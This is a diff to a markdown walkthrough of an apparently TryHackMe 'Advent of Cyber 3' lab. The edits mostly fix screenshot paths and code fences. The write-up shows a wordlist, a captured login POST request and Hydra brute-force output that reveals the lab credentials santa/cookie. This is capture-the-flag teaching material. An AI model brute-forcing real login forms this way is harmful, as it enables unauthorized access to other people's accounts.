@@ -1,7 +1,7 @@
 ## We're first downloading the worlist to our machine
 ```$cat /advent3/day4/wordlist ```
 
-![cat](/Advent%20of%20Cyber%203/Screenshots/Wordlist.PNG)
+![cat](/Advent%20of%20Cyber%203/Screenshots/Task4/Wordlist.PNG)
 ```
 christmas
 elves!
@@ -22,7 +22,7 @@ snowball123
 Now we need the post request, how does it look! for that purpose we use burpsuite!
 - Here's our response!
 
-![burp](/Advent%20of%20Cyber%203/Screenshots/Task4burp.PNG)
+![burp](/Advent%20of%20Cyber%203/Screenshots/Task4/Task4burp.PNG)
 ```
 POST / HTTP/1.1
 Host: 10.10.88.145
@@ -58,24 +58,24 @@ You might be wondering why adding a lot of those options, right?
 
 - We get a response like this~
 
-```http
+```
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-05 01:17:01
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:1/p:16), ~1 try per task
 [DATA] attacking http-post-form://10.10.88.145:80/index.php:username=^USER^&password=^PASS^&submit=Login:F=Invalid username and password
 ```
-```
+```http
 [80][http-post-form] host: 10.10.88.145   login: santa   password: cookie
 ```
 ```
-1 of 1 target successfully completed, 2 valid passwords found
+1 of 1 target successfully completed, 1 valid passwords found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-05 01:17:02
 ```
 
 Right! We've got the password! Which is cookie!, Now let try to attempt to login
-![login](/Advent%20of%20Cyber%203/Screenshots/login.PNG)
-![done](/Advent%20of%20Cyber%203/Screenshots/flag.PNG)
+![login](/Advent%20of%20Cyber%203/Screenshots/Task4/login.PNG)
+![done](/Advent%20of%20Cyber%203/Screenshots/Task4/flag.PNG)
 
 
 We've done it! Well done guys!
